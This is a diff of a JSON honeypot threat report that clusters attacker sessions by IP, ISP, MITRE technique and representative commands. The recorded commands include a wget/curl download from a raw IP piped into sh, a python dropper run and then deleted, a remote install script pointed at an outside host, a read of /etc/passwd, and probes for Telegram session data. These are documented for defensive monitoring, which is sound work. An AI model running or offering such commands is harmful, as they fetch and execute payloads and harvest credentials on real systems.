@@ -1,17 +1,17 @@
 {
-  "generated_at": "2026-08-10T11:11:34.481354+00:00",
-  "total_sessions_with_commands": 6,
-  "total_clusters": 4,
+  "generated_at": "2026-08-10T13:16:11.465770+00:00",
+  "total_sessions_with_commands": 2,
+  "total_clusters": 2,
   "campaign_clusters": 1,
   "singleton_clusters": 2,
   "highest_severity": "HIGH",
   "active_campaigns": [
     {
-      "cluster_id": "CLU-004",
+      "cluster_id": "CLU-002",
       "name": "mdrfckr SSH Key Injection",
       "severity": "HIGH",
-      "session_count": 2,
-      "unique_ip_count": 2,
+      "session_count": 1,
+      "unique_ip_count": 1,
       "ttps": [
         "T1021.004",
         "T1078",
@@ -31,125 +31,49 @@
       "matched_campaigns": [],
       "session_count": 1,
       "unique_ips": [
-        "164.92.109.155"
+        "8.137.167.190"
       ],
       "unique_ip_count": 1,
-      "sequence_hash": "c74cbeb6eac6dc54",
+      "sequence_hash": "c5066f4a71b0151c",
       "ttps": [
         {
-          "id": "T1083",
-          "name": "File & Directory Discovery"
+          "id": "T1078",
+          "name": "Valid Accounts"
         },
         {
-          "id": "T1082",
-          "name": "System Information Discovery"
+          "id": "T1105",
+          "name": "Ingress Tool Transfer"
         },
         {
-          "id": "T1592",
-          "name": "Gather Victim Host Info"
+          "id": "T1003",
+          "name": "Credential Dumping"
         }
       ],
       "representative_commands": [
-        "/ip cloud print",
-        "ifconfig",
-        "uname -a",
-        "cat /proc/cpuinfo",
-        "ps | grep '[Mm]iner'",
-        "ps -ef | grep '[Mm]iner'",
-        "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*",
-        "locate D877F783D5D3EF8Cs",
-        "echo Hi | cat -n"
+        "id",
+        "cat /etc/passwd",
+        "echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"",
+        "enable",
+        "system",
+        "shell",
+        "sh",
+        "bash",
+        "(wget --no-check-certificate -qO- https://217.60.195.113/sh || curl -sk https://217.60.195.113/sh) | sh -s telnet; echo -e \"\\x72\\x65\\x64\\x74\\x61\\x69\\x6C\\x5F\\x62\\x6F\\x74\\x5F\\x74\\x65\\x6C\\x6E\\x65\\x74\\x5F\\x6F\\x6B\"",
+        "wget --no-check-certificate -qO- https://217.60.195.113/sh"
       ],
       "members": [
         {
-          "session_id": "IR-82dc01fdcc28",
-          "src_ip": "164.92.109.155",
-          "country": "US",
-          "isp": "DigitalOcean, LLC",
-          "command_count": 9,
-          "timestamp": "2026-08-10T09:31:03.896653Z"
+          "session_id": "IR-4eaf9829adbe",
+          "src_ip": "8.137.167.190",
+          "country": "CN",
+          "isp": "Aliyun Computing Co.LTD",
+          "command_count": 11,
+          "timestamp": "2026-08-10T11:06:22.761297Z"
         }
       ]
     },
     {
       "cluster_id": "CLU-002",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 2,
-      "unique_ips": [
-        "146.56.164.20"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "d2af147dd3fa2817",
-      "ttps": [
-        {
-          "id": "T1105",
-          "name": "Ingress Tool Transfer"
-        }
-      ],
-      "representative_commands": [
-        "command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3",
-        "apt-get update -y",
-        "apt-get install -y python3",
-        "python3 /tmp/bendi.py",
-        "rm /tmp/bendi.py",
-        "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi",
-        "bash <(curl -sL https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh) -e https://sexy.pp.ua --auto-discovery DsR94pYWmSUpC3n43RmwPxKw"
-      ],
-      "members": [
-        {
-          "session_id": "IR-6a5e9ec825c7",
-          "src_ip": "146.56.164.20",
-          "country": "KR",
-          "isp": "Oracle Corporation , Global software solutions , California , USA",
-          "command_count": 7,
-          "timestamp": "2026-08-10T10:36:53.642438Z"
-        },
-        {
-          "session_id": "IR-4e7b5ed8d871",
-          "src_ip": "146.56.164.20",
-          "country": "KR",
-          "isp": "Oracle Corporation , Global software solutions , California , USA",
-          "command_count": 7,
-          "timestamp": "2026-08-10T10:39:03.015816Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-003",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "45.79.181.251"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "0084449e5825fe2e",
-      "ttps": [],
-      "representative_commands": [
-        "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
-        "Accept: */*",
-        "Accept-Encoding: gzip"
-      ],
-      "members": [
-        {
-          "session_id": "IR-45c753d19a18",
-          "src_ip": "45.79.181.251",
-          "country": "US",
-          "isp": "Linode",
-          "command_count": 3,
-          "timestamp": "2026-08-10T10:25:11.500261Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-004",
       "is_campaign": true,
       "campaign_name": "mdrfckr SSH Key Injection",
       "campaign_severity": "HIGH",
@@ -168,12 +92,11 @@
           "pattern_total": 3
         }
       ],
-      "session_count": 2,
+      "session_count": 1,
       "unique_ips": [
-        "213.176.16.218",
-        "154.83.15.101"
+        "135.13.11.134"
       ],
-      "unique_ip_count": 2,
+      "unique_ip_count": 1,
       "sequence_hash": "98af0db988d5971c",
       "ttps": [
         {
@@ -203,20 +126,12 @@
       ],
       "members": [
         {
-          "session_id": "IR-cee19c4d308a",
-          "src_ip": "154.83.15.101",
-          "country": "HK",
-          "isp": "Yisu Cloud Ltd",
+          "session_id": "IR-216103a48205",
+          "src_ip": "135.13.11.134",
+          "country": "IN",
+          "isp": "Microsoft Limited",
           "command_count": 2,
-          "timestamp": "2026-08-10T10:42:28.937698Z"
-        },
-        {
-          "session_id": "IR-561873e0422b",
-          "src_ip": "213.176.16.218",
-          "country": "NL",
-          "isp": "GLOBAL CONNECTIVITY SOLUTIONS LLP",
-          "command_count": 2,
-          "timestamp": "2026-08-10T10:49:04.682203Z"
+          "timestamp": "2026-08-10T12:20:05.289388Z"
         }
       ]
     }
